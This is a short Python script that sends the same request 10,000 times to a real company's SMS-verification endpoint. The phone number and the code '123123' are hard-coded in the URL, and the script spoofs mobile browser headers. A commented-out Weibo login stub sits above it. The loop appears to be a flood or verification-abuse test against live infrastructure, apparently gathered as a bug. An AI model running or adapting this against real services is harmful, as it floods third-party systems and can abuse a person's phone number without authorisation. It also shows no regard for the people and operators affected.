from urllib import request,parse
import os
# print('Login to weibo.cn...')
# email = input('Email:')
# passwd = input('Password:')
# login_data = parse.urlencode([
#     ('username',email),
#     ('password',passwd),
#     ('entry','mweibo'),
#     ('client_id',''),
#     ('savestate','1'),
#     ('ec',''),
#     ('pagerefer','https://passport.weibo.cn/signin/welcome?entry=mweibo&r=http%3A%2F%2Fm.weibo.cn%2F')
# ])

file_path = "/Users/jiang/Desktop/bug/232.png"
length = os.path.getsize(file_path)
png_data = open(file_path, "rb")
req = request.Request('https://hft02.evergrande.com/broker/rest/sms/checkSmsCode/17074156303/123123')
req.add_header('Origin','https://hft02.evergrande.com')
req.add_header('User-Agent', 'Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25')
req.add_header('Referer', 'https://hft02.evergrande.com/wechatPage/resource/css/jquery.mobile-1.3.0.min.css')
req.add_header('Cache-Control', 'no-cache')
req.add_header('Content-Length', '%d' % length)
req.add_header('Content-Type', 'image/png')

i=0
print(length)
while i < 10000:
    print(i)
    i = i + 1
    f = request.urlopen(req)

